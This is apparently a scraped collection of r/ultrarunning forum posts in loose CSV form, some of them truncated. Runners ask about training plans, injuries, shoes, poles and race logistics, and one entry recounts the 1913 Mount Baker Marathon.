* Elevation gain is a tricky thing to calculate. It's sensitive both to the quality of the elevation data and to the method used to calculate it. If there is a lot of noise in the elevation data, you'll be counting micro-climbs that don't really exist. I've worked with elevation data on my own runs and hikes, and I've had to accept the reality that elevation data noise can easily add more than 10% to the calculated elevation gain of my hike.

This is not meant to be a potshot at barkley. I just think about elevation gain a lot in my own training, and the claim made me skeptical. I think the oft-cited 12k vert number might shrink a bit if we sharpened the pencil. It's one of those things that gets passed down in lore, but I'm not sure anyone remembers who came up with the number or what it's based on.

Stress fracture time off?,"First -(I know the answer, call a doctor)  


W, 40s, been running for decades, pushing 35 miles a week. I've had some weird ""side rail"" pain brewing around my pinky toe, and the interwebs leads me to believe it could be any number of things.  It doesn't quite feel like a neuroma or look like a bunion.

So I want to run an ultra,"So last year I started the year off at 240 pounds or so. I wanted to make a change in my life so I took up cycling because I absolutely hated running. About 20 pounds later I realized running is literally like consuming copious amounts of crack, and so I went onward and became a pretty regular runner, at about 25 miles a week. 

Well towards October of last year I ran my first half marathon. It was just a walk off long run and I wanted to push myself to see how far I could go and sure enough I cranked out 13.5 miles or so. I eventually put in a couple of 15-20 mile runs towards late fall of last year, ending the year with close to 40 mile weeks. I then ended up joining the Air Force (not surprisingly they hardly run at all in the Air Force) but it got me in wayyyyy better strength shape for this upcoming year of running. 

SO. Now I’m here, the whole year ahead, and I’ve made it a goal for this year that I would like to run an ultra. What sort of training plan should I look at? Realistically I have never “trained” for a race before, and don’t really know what all that entails. I used to “just run” to increase mileage, but I figure at this point in the game that eating, strengthening, rest days, tempo runs, and all that will really become a factor instead of just getting out on the road for however long. Reddit has always been a pretty resourceful place so I figured I would turn to you folk for some advice as to where to go from here. I am in the best physical and mental shape of my life and just want to capitalize on that by putting down some serious miles and challenging myself even further.

How detrimental for the knees is running on road really?,"I'm sure we've all heard of the notion that running on road (or other man made surfaces) is bad for the knees, but how much truth is there to that claim? Is anybody aware of any research or have any anecdotal reports they'd like to share? 

Due to geography the only surfaces I'm able to run on, out of convenience, are road and pavement. Especially at this time of year. The only other surfaces immediately available to me are marsh lands, bogs and sandy beaches. As you can imagine, running on boggy land during a wet winter isn't ideal. As such, and given the fact that I don't drive, I'm stuck running on road – luckily I live in an area with plenty of long and sometimes pretty steep hills. So I was wondering, what are the implications for my – still young – knees of clocking more and more mileage on road and pavement? 

I feel like I'm doing everything that I can to avoid any joint issues. I use 4mm drop shoes, I'm a mid foot first runner, I strength train (that's my background so I'm experienced in that regard) and I take recovery seriously.",ultrarunning,1645344102

Importance of DrY Feet for 150M Ultra?,"I ran a 100 milder a few years back. It was 10 mile loops and included rain, mud and many shallow creek crossings. Suffice it to say I had wet feet for 28hr. I made it but was hard. Dry feet would have made the experience much better. In April I’ll attempt a 150 miler. 10 mile loops with 2 shallow creek crossings. Options are to not care and have wet feet for 45 which I believe will impair my odds of finishing or try to find something to cover my with or simply remove my shoes for the crossings per loop.

When to push through pain vs stop?,"Both in our broader cultural ethos and in the ultra community we hear so much about “pushing through pain, “finding inner motivation to overcome pain” “finishing at all costs” etc

Advice on an injury,"Not an ultra runner but an endurance athlete but I believe you guys would be the best people to talk to. 

Back story: I caught COVID in early January and took about 10 days to get back to 100%. Directly after recovering I did a half marathon and felt great until I tripped over a root and pulled my hip flexor around mile 10 which added excess pain/stress to finish the race. I took one day off then got back to training hard but went easy on my legs. 3 days after the half marathon I met up with a group of people training under a coach, and against my better judgment I did a 3 mile for time with them. I’ve never had a run more painful. I pretty much kept my normal pace but my average heart rate was 198 and it topped out at 210. I collapsed at the end and my body was done. After that I took 5 days off and got back into training (light weights, cals and swims) and felt fine for a week but at the end of the week I did a ruck and woke up with that same fatigue. Ever since then my body hasn’t been able to perform. I’ve take a combined 10 rest days the past 3 weeks and I can’t seem to recover. I’ve done an easy 5k once a week the past 2 weeks and each time has left my legs dead for days. My energy levels are perfectly normal. Symptoms I’ve had are: soreness in the palms of my hands and soles of my feet, muscle spasms to different muscle groups all throughout the day, and a bruised like feeling (not soreness) in my quads after the 5k’s. I’ve experienced several cycles of muscular fatigue and this just feels different.

Collected Pieces of Unsolicited Advice,"Hey all, a few weeks ago I wrote up a [tough love](https://www.reddit.com/r/ultrarunning/comments/shnj8k/the_best_way_to_prepare_for_an_ultra_is_to_train/) piece on why you should be training consistently. I wanted to expand on that, and go over some of the pillars I associate with strong runners. Just a disclaimer, I'm not a pro or a coach and all of this comes from my own experience, don't take it as gospel

First and foremost, all the pieces of your training are interconnected. Every run you do, every meal you eat, and every training decision you make feed into a self-reinforcing cycle. That cycle can be productive or destructive, it all depends on what you put into it. So I'm going to focus on some of the pieces I've found most helpful.

1. Adding two 20 minute sessions of weightlifting into your weekly schedule is a super easy way to get faster and more resilient. When I think of what makes a strong runner, I like to use a car as an analogy. You've got the engine, which has to be powerful and efficient to get you moving, and the chassis, which has to be strong enough to support all the power coming out of the engine. Weightlifting improves your engine and chassis all at the same time. [You can get a decent session done in 8 minutes, ](https://www.trailrunnermag.com/training/trail-tips-training/8-minute-speed-legs) and you don't need expensive equipment. If you enjoy this stuff, you can supplement with [plyometrics](https://www.runnersworld.com/advanced/a20783990/improve-running-economy-with-plyometrics/) and [bodyweight excercises](https://www.mensjournal.com/health-fitness/best-bodyweight-workout-runners/)  Weightlifting is free gains, take them.

2. If you only train slow, you'll race slow. I think one of the biggest misconceptions among ultrarunners is that because our racing distances are longer we don't need Speedwork. But being able to run fast comfortably is essential if you want a smooth racing pace. Speedwork is an essential part of building running economy, which is essentially the amount of work it takes for you to run a certain pace. Super fast runners have extremely strong engines, but they're also *economical*, it takes them less effort to run the same pace as you because they're all around more efficient. Speed work doesn't have to be gut wrenching or over-frequent, 1 workout a week is enough to start building speed. I'd focus on shorter intervals, (8x (1 fast/1 easy, 2 fast/2 easy ect.)) but this is an area where you should feel free to explore different workouts and do what you enjoy! You can also add some strides (20 second sprints, focusing on good form) into your easy runs to get some extra Speedwork in. As you develop this

3. In running, consistency is everything. There can be real physical consequences to training for and running races without a solid baseline of fitness. I've seen many athletes roll through a cycle of under-training for months, compensating by over-training with a couple of big weeks, barely crossing the finish line, then getting right back down to 10mpw until they want to race something again. Almost invariably these people develop chronic injuries or over-training syndrome, and drop out of the sport for months to years at a time while they recover.

 If you want to run an ultra, get faster, or even just run injury-free   you need to build up a consistent base of mileage. The longer you've been running and the fitter you are, the more you can get away with. But for most of us mortals that means running at least 20-30 miles a week as a baseline. You want to get faster? Get injured less often? Get a training plan, a book, or a coach and run consistently for a couple of years.

4. Diet matters. This one cuts both ways, weighing less is going to make you faster up to a point but trying to cut weight during training is risky. Sustained caloric deficits are stressful on your body, and when you combine them with hard high mileage weeks you have a recipe for over training and injury. Like we noted before, in running consistency is everything. Losing a little more weight a little faster isn't worth it if you're risking the consistency you've spent years building up. 

 As someone who dropped 20 pounds over 2 years and noticed a real difference in my speed, my only suggestion would be to focus on eating more fruits and vegetables. For me, approaching weight loss in terms of cutting OUT food does not work. I undereat, can't sleep, and have chronic fatigue issues. Focusing on eating more vegetables and fruits helps me fill my plate up with volume, while still enjoying all the carbs that help make me faster. Really important to note that diet and weight are super personal, and what works for other folks might not work for you. If you want to lose some weight I would encourage you to try a lot of different things, be super forgiving of yourself, and not worry about it too much. Ultimately none of us are professionals and running should be about having *fun*. If cutting weight is stressing you out, forget about it entirely. 

5. Everything else helps on the margin, so do what works for you. There are hundreds of thousands of you-tubers claiming to have the stretching routine, bodyweight exercise, ice-recovery foamgun that'll totally revolutionize your training. The harsh reality is that a lot of the science behind this stuff is murky at best. That's not to say they don't work, its just not clear that they 100% do. My only advice here would be to try lots of things, and incorporate the ones that make you feel stronger and more confident. Different stuff probably works for different people, so don't feel like you *have* to do anything to train well. 

6. Have fun! This is the most obvious, boring point, but even if your focus is on being the fastest strongest runner possible, you should always do it with an eye on your own personal enjoyment. Being the best runner you can be is a lifelong endeavor, no one training cycle will make or break your potential. If you're feeling run down, take a day off. If you're in a slump and you're not enjoying running at all, take a week or even a month off. Ride a bike, try knitting, play tennis. Frankly, the athletes I know who push through their un-enthusiam for running almost invariably get hurt or just stop running entirely at some point. Maybe they're overtrained, maybe they're just bored, but their body and mind are trying to tell them to take a break. So do that! Above all be easy on yourself, and remember to enjoy the journey!",ultrarunning,1645069627

Advice/tips for someone who gets lost very easily/has a poor sense of direction?,"I’ve been getting into trail running, and running longer distances and have been toying with the idea of doing an ultra (50k or 50 miler), however my sense of direction is quite poor and I’m really worried about getting lost during races. 

In high school XC, I would frequently nearly get lost in races. I say nearly because I was fortunate enough to have a teammate with an adequate sense of direction that was running at similar level, and so she would correct me. It was to the point that I would have significant pre race anxiety about getting lost. 

Does anyone have any tips? Scoping out the area beforehand has always helped, not sure how feasible that is though with some courses. Obviously getting lost sometimes is just part of ultra races, but my concern is that this would be a much more frequent occurrence.

Cross-training while recovering from an Achilles injury,"The short version - I’m just about positive I have a somewhat serious tear in my left Achilles (not a full rupture yet, though, thankfully).  **I will be going to see an orthopedist/orthopedic surgeon as soon as I can to get it properly examined/ diagnosed and find out how severe it is**, but because it’s a common enough running injury I figured some of you must have dealt with something similar and learned to pivot.

My main sport outside of trail running in the past couple of years has been climbing, but from what I saw online, it looks like that’s going to be a no-go as well (but I’d be happy to be mistaken).  I think I’m going to get back to some upper body weight training and finally work out some of my imbalances higher up the chain, but I think I’m going to need some kind of cardio substitution to keep sane in addition to the lifting.  I don’t know how biking is for folks with this injury and I’m not crazy about the idea of swimming in a public pool, but I know this is going to require some compromises and I’m wondering if there are any safe exercises that translated particularly well to training after healing or were particularly enjoyable in and of themselves.

Do you run with a cold?,"I have gotten my first cold in 2 years since Covid started, haven't run before that and have gathered up to 40-50k weeks. Do you guys run with a cold or go for a full stop recovery week?

Getting rid of belly and love handles,"Hi guys,

So I'm 42. Almost 43. I run several ultras each year. I did 2 x 100 miles last 6 months. I do pretty intense training around 70K a week including hill climbs.  I walk the dog 2 hours a day for 10k total which is another 70K each week. During that I throw with balls and sticks, I run up hills with him. So it's actually quite the workout.

I run 2 marathons each year with a PB of around 3:15. Plus I run my fair share of races like a couple of them every month which varies from half road marathons to 20-40K trails up to 160K.

I try to eat healthy. I cook fresh every night and I don't snack too often. I'm doing this for years now. And yes I did lose weight. I went from 95 kg to 82 kg (I'm 1.95m) which is pretty amazing but I'm on a plateau right now where my weight is always the same. And I can't seem to get rid of my love handles and belly fat.

I talked to a guy when I ran MDS and he had the same issue. He was even faster than me.. He was a beast and made like top 50 yet he had the same handles. I'm struggling a bit with this, wondering how to fix this and get rid of the fat. I have the feeling I could even be faster when I would lose another 4-5 kg.

However, when I try to eat less my training suffers from it. And then I have to compensate by eating more for my next training. I tried stuff like intermediate fastening but it's not for me.

So how do I fix this :) Get that six-pack while still have enough energy for my training runs. And without being hungry all day long.

Thanks!",ultrarunning,1644935136

24-Hour Track Race: Advice Needed!,"I am a decent ultra runner and covered all distances up to 100K multiple times. I have a 24-hour race planned for Spring. I did 24-hour challenges before (run X miles every 4 hours). 

The race is a prep-race for my first 100-miler late Fall. I plan on covering as many miles as possible (keep moving for 24 hours) and hopefully learn more about nutrition (and digging myself out of trouble). I thought a track race would be great as the access to my own stuff is easy. 

Direction will be changed every 4 hours. So lots of left turns and then right turns, and so forth. 

All flat which might be super demanding on the same muscle groups. 

Most of my races have been trail races. Nothing short-loop, though. 

My current plan is to tackle this in 5 mile blocks of running and walking (some gels during the 5 miles), then get some decent nutrition in between the 5-mile block (essentially hitting the aid station every 5 miles). Changing shoes every 3 hours. I usually do not listen to anything while running, but I am planning on listening to music or podcasts during this one. 

I am looking for advice on running on a track for 24 hours. Really short loops, the turns, etc. I am open to any advice or sharing your experience.",ultrarunning,1644847104

Shoes - an endless search,"Hi all,

Fairly new to running coming from road cycling at a decent level, typically 600km training weeks, 200km+ races etc. 

I decided to get running after taking some time off racing/riding due to our youngest daughter being born and thought it would be a great thing to do with my wife as she has always been a runner. One thing lead to another and I'm totally hooked, I love to suffer and running long distance through the bush sure feeds that beast in me. Currently training for my first 56k race with 3,800 metres of vert but I'm struggling to find shoes that work. Looking to build up to a 100k event sometime next year with a goal of a 100miler maybe 2024.

Unfortuantely I have wide and thick feet through the midfoot. Not really knowing much about running gear I did some reading and grabbed a pair of Hoka Challenger ATR6 but didn't like the stack height or the cushiony ride, they also hurt the arch in my left foot. Decided to go the other extreme and try Altra Superior 4 's and really loved the minimalist feel, but after a 22k run last weekend my achilles and left foot were smashed. I figured as I hadn't built years of running in shoes with drop the transition to zero drop might not be too extreme. 

I recently bought my wife a pair of Salomon Ultra 3's and she loves them. Figured I'd try them myself despite reading they're a narrower fit and yep, there's no chance I'm wearing these so back they go.

Currently looking at Inov-8 G270's, Lone Peak 6's, Cascadia 16's as options. I realise there's differing opinions on zero drop but from what I've read I'm almost feeling limited to Altra clown shoes as even the Superiors are snug across the midfoot.

I'm wondering there's anything along the lines of Salomon Ultra's for my boat feet?

Confused and sick of ordering shoes only to send them back as I live in a regional area and there's not a lot of opportunity to try shoes on.

24 weeks to train for 50 miler. Is it enough given my experience?,"I've done a few half marathons and just completed a marathon a few weeks ago.

I would really love to sign up for the Pikes Peak 50 miler at the end of July. That gives me about 24 weeks to train. I live in CO and I've been running trails on and off for about 10 weeks so not a total noob but still a lot to learn.

3rd 29 mile race completed!!,"So, last weekend I posted along the lines that I didn't feel ready for my 3rd trail marathon (29 hilly miles of Hardmoors glee!).  


I obviously was because I did a PB half marathon, PB 30Km and smashed my time on almost every segment in that race.  


What gets me is that it's taken until now to start to enjoy the sense of achievement. The days since the race have all been about how much faster it could have been! 2 navigational errors cost me minimum 5 mins each plus there was 10 mins sheltering from a 50mph hail storm. That stuff hurt my legs, it was brutal!

Next big one is being part of a 110 marathon team (28 miles each of hills and fun) in May then a 45 miler in July. For someone who was never bothered about doing more than a half marathon this has somewhat blown up!

new shoe recommendations for Ultra-Trail Snowdonia,"I've signed up for UTS100, which, aside from the beastly vert, is a lot rockier underfoot than I'm used to. It's this summer.

My favourite shoes ever are the Inov-8 Terraultras but the recent models have a stupidly thin tongue. The last few ultras I've done in them, I've had pain and a bump on the front of my ankle, caused by the laces digging in. It's restricted my running for 2-3 weeks after.

I also use Lone Peak 5s but I've got a big hole above my big toe after only 500k. I'm questioning their durability. They're also stupidly wide and my foot rotates too much within them when on rocky trails. But they have a decent tongue and have a similar good feel for the ground like the Inov-8s. I could look at going from size 11 to size 10.5 - that's probably the obvious option.

Ideally, I want the following from the Inov-8: zero-drop, low stack height, grippy on anything but loose mud, flexible and good feel for the terrain, durable sole, durable upper. And the following from the Lone Peaks: padded tongue. Any suggestions? I probably need something that's going to protect me from sharp rocks, I guess.

I'm looking at NB Hierros as an outside option, but my main alternatives to getting a size 10.5 LP5 are other Altra shoes. I'm not sure which? What's the difference between LP, Olympus, Superior and Timp? Also Adidas Terrex Agravic?

Shoes that are too old or shoes that are too new?,"Friends, I have a 50M race this weekend, and I have a shoe dilemma.

I'm afraid the older pair has lost too much support for a 50-mile go, and I'm afraid the newer pair hasn't been properly tested.

Do I:

(a) Wear the old ones, since I did most of my training in them, and 320 miles isn't really that much;  
(b) Wear the new ones, since they have the most life in them, and they will probably be fine; or

Road 100K shoes,"Hi gang,

I’ve got an event coming up in April. It’s normally a relay event, 67 miles — but I’ll be doing it solo.

The course is about 80 percent paved, the rest on dirt and gravel forest roads.

I’ve done three trail 50’s and a six hour event, with my favorite shoe being the North Face Vectiv Enduris. They’re mildly treaded, definitely still comfortable for pavement, though I haven’t been using them for 2+ hours of all hard surfaces.

On the road I mostly use Adidas Pureboost DPR (it also got me through my first two trail 50K’s and a road marathon). I do have Endorphin Speeds and 4%s for workouts/races but neither seem like the go-to for 11+ hours. Or am I wrong on that point?

With 2.5 months to go, I’ve got time to try some different things. The high stack and rocker shape of my TNFs has me thinking about HOKA. Any ideas for where to start there? To make things a bit harder, I’m in a small town without a HOKA shop within 100 miles, so will be ordering online. Other brands certainly considered, though!",ultrarunning,1644381756

Coaching - what would you do?,"Hey all! Been kicking this question around my head for a bit and thought I'd see what y'all think. I've been running for 3 years and have had a coach for 2.

What's worked is my volume has increased and I finished an ultra.

I'v heard that there are major gains to be had in the first few years of running, and am wondering if my current programming could be missing something if there's been no improvement in that area of fitness? I should add, I run 10:00min/mi easy paces, so there is definitely realistic room to improve.

Ways to pin down excess straps on rucksack?,"Hi All,

This isn't strictly ultra related but I figured this running community uses rucksacks more than most so would have ideas. It's also the most responsive and helpful online running community I know of anyway.

I just got a new OMM Classic 25 to replace my old OMM Classic 25 and while I love it only the waist strap came with an elastic band/strap thing to hold the excess in place. On the chest, shoulder and main bag straps the excess just flutters about when running. I can tie them up or tuck them into side pockets but they tend to shake out, plus it looks ugly and my new bag looks so sleek atm. 😅Anyone know of any nice solutions for securing the excess strap in place?

Getting some spare elastic strap bands like those on the waist belt would work but I can't find them online (not sure what they're actually called). They tend to lose elasticity within a couple of months so I'd prefer something longer lasting.

&amp;#x200B;

PS I 100% recommend OMM rucksacks. My old one is still in surprisingly good nick given it's seen 4.5 years of daily use. I mostly replaced it because they've made some great updates to the design on the latest model and because I use one for daily use, so having a old but usable one I can get super dirty/sweaty is handy.",ultrarunning,1644144508

Creating a crew binder,"Hi all.

I'm just a week out from my first 100k, and I'm putting together a crew binder for the people I've managed to trick into helping me. None of them has any ultra experience (and neither do I, to be honest; I've only ever done self-supported stuff). 

So far, I've got a map with parking spots and walking directions for the aid stations, a checklist of what to do when I arrive at an aid station, and a list of items and in which box they can find it.

What are some other must-includes in it to make my experience and theirs as smooth as possible?

GPS watch difference.,"Last night I went for the first real run with the coros apex and ran it at the same exact time as my Apple Watch using the fitness “run workout” feature. The strange part is the pace is almost identical but the distance between the two watches started and stopped at the exact same time was .09 miles. So the coros said 6.65 and the Apple Watch said 6.74 miles at the end. I would assume the coros is more accurate because from what I’ve read they use multiple gps satellites (I think). Anyways just wondering what you guys have seen and think, is the coros more accurate?

"I've run 2 ultras, a year off running and I'm lost getting restarted.","A little backstory so you know where I'm coming from and where I'm at. I ran for years, nothing crazy, normal distances (5k, 10k, half's etc) then in early 2020 got a wild streak in me when i realized regular races and distances were boring because everyone does it and i started training and ran 2 ultras (50k &amp; 65k) and was trained and ready for my 50 miler then the world shut down. My race was cancelled and I ended up losing my job, home schooling my son and daughter for a year and moved to the opposite coast to be with family. Now the kids are back in school and I'm working part time, i NEED to get back on that stupid crazy running schedule for my own sanity, it's my quiet place to go run for 4 or 5 hours. I need that to feel normal again.

But my body disagrees. I started running again last week and planned out an easy-moderate run schedule starting out 3 days a week until i lose this Covid-20# (never had Covid, just mean the 20# from not being active HA). FML I struggled on just 2 miles, I can barely go .25 mile without needing a 30 second walk break.

The best way to prepare for an ultra is to train well for several years,"Ultra's aren't like other road races, there are real risks to cramming training. 50+ miles are hard on the body and there can be real physical consequences to training for and running races without a solid baseline of fitness. I've seen many athletes roll through a cycle of under-training for months, compensating by over-training with a couple of big weeks, barely crossing the finish line, then getting right back down to 10mpw until they want to race something again. Almost invariably these people develop chronic injuries or over-training syndrome, and drop out of the sport for months to years at a time while they recover.

The hard truth of running is that there's only one silver bullet, consistent training. If you want to run an ultra safely you need to build up a consistent base of mileage to build on. The longer you've been running and the fitter you are, the less you can get away with. But for most of us mortals that means running at least 20-30 miles a week as a baseline. You want to get faster? Get injured less often? Get a training plan, a book, or a coach and run consistently for a couple of years.",ultrarunning,1643694656

Goal would be to strenghen my foot after training with the Arahi, before potentially turning to minimalistic shoes.

But after hours of looking online I'm totally confused, what shoe would be a good fit. I just want a running shoe on the cheaper end of the price scale, with moderate cushioning, that could be a good transition from my Hoka to a minimalistic shoe like a Merell Vapor Glove.",ultrarunning,1643633499

What To Do?,"Went to a sports chiropractor at the end of December. He did an adjustment, told me I had a slight leg length discrepancy, and that my right knee and lower back pain were coming from overcompensating for said discrepancy. Recommended an insert for my right shoe. I’ve been wearing the insert since December in all of my daily shoes. No more feelings of knee popping with the insert, but dull pain on the outer side of my knee still makes visits. 

After a visit to my massage therapist Thursday evening, she thinks my right hip and the muscles leading to it are extremely tight, which is what’s causing my knee pain. She recommended stretching, of course, but hip mobility and strengthening exercises.

Do I continue using the insert, not use it and focus on the exercises, get a third opinion, or all of the above? I’ve got my first in-person that I’m training for in June and want to make sure I’m training safely and efficiently.

Speedwork: yay or nay?,"I have now managed more than 40 months injury free by being very very cautious, and taking the 'run slow' thing seriously.

I do most of my runs pretty slowly, plus some tempo-ish running. 

But my regular running buddy is getting faster than me- and he is doing regular speedwork. To be fair he has always been sportier than me, but still. We decided together to build up towards ultras starting two years ago. We are both in our 40s- well actually he just turned 50, I'm 46.

To Pole or Not to Pole,"Hello All, would love some experienced advice. 

I have an ultra marathon this summer. It’s my first trail marathon and has an elevation of about 2100m/6995ft of elevation. My friend who is doing the longer distance (125km) recommended that I get poles — they’re allowed in the race and quite common among ultra racers here. 

I’ve done my research and the best recommendations is Lekis MCT but as a Canadian this is so expensive it blows my mind. I can’t justify $250+ on poles that doesn’t have a return policy as shipping here is very limited where I am. 

My local MEC has some Black Diamond on sale (ranging from about $120-$180). I’ve heard Costco has poles too but I don’t see them available yet on the Canadian store. 

From what I’ve seen, all the races have Z style that are collapsible. 

I’m trying to decide between the aluminum and carbon lines from DB. I’m okay with spending a bit more if the poles with last. I live by the Rocky Mountains but will be moving to the PNW in the fall. 

I don’t run that regularly on trails, especially trails that would merit using poles. I’d like to get poles early to start using them during training. I would double up and use them for hikes as well.

Trail shoe vs. boot - 61mile in mud and rain,"I've got an event coming in April, in the North of England. The distance is 61mile over varied terrain but certainly includes mud and bog as well as some road and trail, conditions are traditionally 'wet'. I did this event some years back as a walker, finishing in just over 23 hours, and I was very much geared up as hiker including full ankle walking boots. I'm now heading back a little older, but much more of a runner, with a view to improve my time (although conditions will dictate as much as gear and training).  


I have been training with the Inov-8 Roclites 370s (v. light boot), they took me some time to get used to but I just about comfortable with them. The main problems were the lack of material meant my feet took most of the impact and they were not at all waterproof, although on this event it doesn't matter much as I'll be up my knees at some point.  And they've now fallen apart anyway. 

For my normal hiking I've got a pair of Scarpa ZG lite GTs, which come in at 600g/pair. They are solid and will support me for the distance I'm sure, but they essentially discount any chance of running. 

I've also got trail shoes Hoka Speedgoats, but I can't believe they will cope. 

So looking for a good middle ground I've come across the the new Roclite 286 GTX, but now I'm worried I'm looking for the 'everything boot' and I will end with a compromise that comprises everything and maybe I should cut the crap and get proper trail runners? 

I know the usual advice is I have to try and see what works for me, but I still need a starting point, and I have limited time (and budget) to be buying shoes and giving them real trials.

I am thinking about running a 67k/42miles race in end of March, but I am not sure how feasible it is, while also climbing 3 times per week, and I will not stop climbing.

Could i keep doing what i am doing, and just run longer distances and maybe sometimes run on Saturdays also?
I could also run from work to the climbing gym sometimes, or maybe run to work in the morning. 

But I prefer to keep it simple, and just run 3-4 times per week. It that even possible?",ultrarunning,1643294059

How to train for a 100 mile ultra?,,ultrarunning,1643222895
Considering running an ultra - had a question,"Hey everybody, 

So I am an avid runner and this year I told myself that if I PR'd on my January marathon that I would consider running a 50k or 50 mile. I PR'd and so am now looking at some towards the end of the year. The one I am planning to do is an almost entirely flat looped course and from everything I've read about it it is ideal for first-timers (it's the Children of the Cane Run in Louisiana). 

My ""dilemma"" is this. Bottom line is that I KNOW I can finish 30 miles, while it is more than a marathon it is not so much more that I would be worried about not finishing (even if I had to walk the last 4 miles). As someone who has never run an ultra, should I start with 30 and then go to 50 at another point - or should I start my training with looking to do 50. The ultra isn't until the end of October so I am planning to begin my training not too long from now. But, 30 just seemed like too small a goal, although 50 seems like a fucking immeasurable distance to run.

Feedback re long run distance please!,"Hi runners!

My question below actually relate to the marathon distance (and a lofty goal time) but this community is much more active, considerate and informative than any threads on the marathon I can find so hopefully that is ok 😁

Before kicking off, I appreciate that all plans and goals are relative to the individual and their circumstances so what works for some might not work for others. 

My key question: _is 45% of weekly mileage too long for the long run?_ 

My interests (and reason for asking re 40%) are:
- longer long runs allows me to run fewer days but achieve a moderate build of total weekly mileage. I only want to run 4 days a week (Sunday on the bike to recover) 
- The last 6 months I've switched from more days, shorter distances to running fewer days but longer runs. My body likes the recovery. 
- I like having time to lift heavy weights but when I ran slow/easy every day, I never felt fresh enough to workout properly. 
- Having trained for 50km ultras the last 2 years (1 was cancelled) I know I can handle the higher distances. I prefer to go faster (less time running, less vert, not carrying as much crap in a vest) so while the stress is more intense (pace), it's also 'less time on feet.' This part I'm weary of as bludging on the trails, stopping, eating, taking photos (lol) is way easier than no breaks, higher HR, faster pace, much faster finishing etc. 

In my draft plan:
- my plan is 22 weeks long (2 week taper incl race week) 
- my highest volume is 80km/week with a 36km longy, 21 days before race day. Not high at all, but not sure I could handle more. 
- plan cycles through 4 weeks (4th week is always recovery ie less volume) 
- there are 5 weeks where longy is 30km or above, but all weeks bar 1 are above 20km (other than rest weeks and taper)

Currently average 50km/week, 1000m of vert, about 20km longy with a fast finish (3-4km at GMP at end of the run). Feel pretty fit but don't want to cook myself! 

Thanks in advance! Goal is sub 3 so I need all the help I can get!!",ultrarunning,1643072375

Thoughts on Breaking Up Long Run into Two?,"Hi All,

I've been working out my training plan for a 100 I have in June.  It's a 24wk plan peaking at 70miles/week. Each week there is a long run one day (16-24miles) followed by another the day after (10-20miles).

I plan to do these long runs in the week, and my question is whether it would be detrimental to use my commute to/from work to do these runs? An example would be:

Day 1 Morning - 6 mile run to work
Day 1 Evening - 14 mile run home
Day 2 Morning - 6 mile run to work
Day 2 Evening - 9 mile run home

This would save me a lot of time but it means the longest continual run I'd do in training (barring the 50 and 100k tune up races) would be 18 miles.

1913 Mount Baker Marathon (50k),"

In 1913, during America’s earliest mountain trail ultra, Mount Baker Marathon (50k), a runner was lost during the race. While running down a glacier on Mount Baker in Washington, Victor Galbraith, age 32, dressed in scant running clothes, fell into a 40-foot crevasse, and couldn’t get out. Several hours later, a search party was able to find his footprints, heard his shouts, and hauled him out with a rope.

Galbraith suffered from shock, exposure, bruises, and was carried down on a stretcher. He later said, his first thought was wondering if he could get out. His second thought was disappointment that he was out of the race. The ultra was discontinued for the next 103 years.

"Building back up and getting hit back down, anyone else have experiences like this?","Background:
I make a lot of dumb mistakes while training. I feel for me, I need to make extremely slow changes or I will not adapt and will get injured easily. 

I have been running for 5-6 years with the past few trying to get more serious, but for each training cycle I start I usually find out the hard way that my body does not react like others or at least what I read on the internet.

Some more specific background: 
Last year at the beginning of 2020 I was running about 50-60 MPW. Everything was clicking perfectly, but wanted to start switching more to trails/elevation to train for a R2R2R adventure. I usually run trails if I can, but had been running a lot of road miles due to the winter months. Decided I want to do some hill repeats once a week and then build more and more hills/elevation as the weeks progressed. Felt like I took the first hills workout easy, but the next day my quads told me I didn't. They were sore, but didn't feel like an injury just some DOMS. I took the next days easy and the pain went away. However, after that happened other things started to pop up here and there. Nothing too significant, but frustrating. Ended up having to miss the R2R2R adventure anyway due to a COVID scare and having to isolate. 

After all of this, I wanted to take some down time and then was unmotivated due to the lack of races around me or at least nothing I wanted to train for.

Start of the topic discussion of my training:
Around beginning of November of 2020 I wanted to start training again. During the summer I had some builds, but never amounting to much. Lets say I was starting from 0. 

Started week 1 with 9 miles total - 3x days at 2 miles total and 1x day with a 3 mile ""long run"". 

Weeks following were: 11 miles, 14 miles, and 10 miles (missed a day due to the booster taking a lot out of me) running 4 days a week still. 

I wanted to focus on running shorter distances, but more frequently in this build up to see if my body recovered better. 

So, at week 5 I started running 5 days a week: 18 miles, 22 miles, 25 miles, and 29 miles total. 

At week 9 I started running 6 days a week with the first being my first big jump in mileage from the previous week (I guess mistake): 36 and then 34. The second week here would have been 40, but on I went to the trails for my long run and they were super muddy, so only did 1x of the 2x 6 mile loops.

Also during this week my left knee started to feel like an injury was popping up. Decided to take 4 days off to rest and recover and then ease back into mileage. Finished off the next week with 13 miles total (4, 3 and 6 mile days). Knee felt okay, added some core and strength work to combat issues, etc... but my aerobic fitness seems to have plummeted in just 4 days. The 3 days of running this week were quite hard. For example, I was running sub 8 min/miles and not feeling too fatigued after my runs. This week running &gt; 9 min/miles and shorter distances my HR is higher than previous weeks and it obviously feels harder too.

Monday is my rest day, so starting this week my first 2 runs were 4 miles and 3 yesterday, but despite running really easy still ~ 9 min/miles, my heart rate and effort was really high. I only planned to run about 26 miles this week to be in between my last week and where my mileage was prior to the 4 days off. 

Everywhere I read on the internet, people say or articles say if you take ~1 week off you should be able to start back where you were (maybe taking it a little easier though). I take 4 days off and I feel like my past 10-12 weeks of building has disappeared/my fitness is gone... Am I going crazy?

Maybe I made a mistake when I jumped up to 6 days a week and went from 5 days of running @ 29 miles total to 6 days of running @ 36 miles total, but really the other parts of my build have been pretty reasonable I feel. 

My knee feels reasonable, no significant issues yet. Going to continue to strength train/foam roll regularly and ice/ibuprofen if necessary. 

I plan to go for a 6 mile run today, taking it super easy again, and assess more after this run. If it is super hard, I am not sure what I am going to do. Would feel terrible if I had to ""restart"" training or take time off... anyway, maybe this is more of a rant than anything else, but what are your experiences when building mileage back from ""zero""... do resources on the internet really help you? 

My final thoughts are, I feel like I am less aggressive in mileage increases than those in many plans on the internet or many advices on the internet, but still have many hiccups when getting back into things.",ultrarunning,1642698616

I only went and did it: signed up for my first 60km,"Well- I signed up for the lottery but I am kind of shitting myself.

What: the TP60. This is the little brother of the Madrid region's number one ultra, the Gran Trail Peñalara. This mini-ultra usually comes in a taround 62-65km, with 2500-2800m of vert depending on the route. The race goes over the highest peak in the range at 2428m (Peñalara), and has some pretty technical sections including a gnarly ridge. I know most of the route quite well, as I hike and run a lot in the Sierra de Guadarrama. 13 hour cut-off

When: October 9, so only 37 weeks left to prepare!

